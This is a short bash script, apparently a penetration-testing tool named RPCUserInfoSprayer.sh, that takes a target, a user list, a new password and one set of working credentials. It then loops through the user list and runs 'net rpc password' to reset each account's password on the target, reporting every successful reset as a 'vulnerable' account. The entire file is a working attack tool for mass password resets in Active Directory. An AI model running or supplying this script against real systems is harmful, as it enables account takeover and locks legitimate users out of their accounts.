#!/bin/bash

# This script will enumerate the RPCClient setuserinfo command using the net library against a list of users with valid credentials. 
# For more information: https://malicious.link/post/2017/reset-ad-user-password-with-linux/

if [ $# -eq 0 ]
 then
  echo "No arguments supplied.";
  echo "Usage: RPCUserInfoSprayer.sh <target> <userfile> <new_password> <auth_username> <auth_password>."
  exit 1;
fi

if [ $# -eq 1 ] && [ $@ == '-h' ]
 then
  echo "Usage: RPCUserInfoSprayer.sh <target> <userfile> <new_password> <auth_username> <auth_password>."
  exit 1;
fi

#Setup colors
RESET='\033[0m';
RED='\033[1;31m';
GREEN='\033[1;32m';

#Setup parameters
target=$1;
userfile=$2;
newpassword=$3;
authusername=$4;
authpassword=$5;

counter=0;

#Spray
for username in $(cat $userfile); do
	echo "% Trying user: $username";
	output=$((echo "$newpassword"; echo "$authpassword") | net rpc password $username -U $authusername -S $target 2>&1);

	if [[ $output == *"ailed"* ]]; then
  		echo -e "%$RED FAILED$RESET setting password for user $username."
	else
		echo -e "%$GREEN SUCCEEDED$RESET setting password for user $username."
		(( counter = $counter + 1 ))
	fi

	echo -e ""
done

echo -e "Scan finished. Found $GREEN$counter$RESET vulnerable user account(s)!";
